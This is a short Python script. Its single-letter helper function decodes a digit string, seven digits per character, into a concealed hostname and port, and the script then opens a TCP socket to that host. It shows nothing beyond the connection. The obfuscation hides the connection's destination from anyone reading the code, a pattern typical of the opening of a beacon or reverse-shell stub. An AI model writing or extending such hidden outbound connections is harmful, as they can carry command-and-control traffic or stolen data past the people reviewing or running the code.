import socket
def a(*g):
    b = ""
    c = []
    d = []
    e = 0
    f = ""
    for i in range(len(g[0])):
        if e == 7:
            c.append(int(f))
            e = 0
            f = ""
        f += str(g[0][i])
        e += 1
    for z in c:
        d.append(chr(z))
    for v in d:
        b += str(v)
    return b
j = (str(a("0000104000011100001080000108000011100001190000046000010000001000000110000011500000460000110000010100001160")), int(a("00000530000057000004900000500")))
k = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
k.connect(j)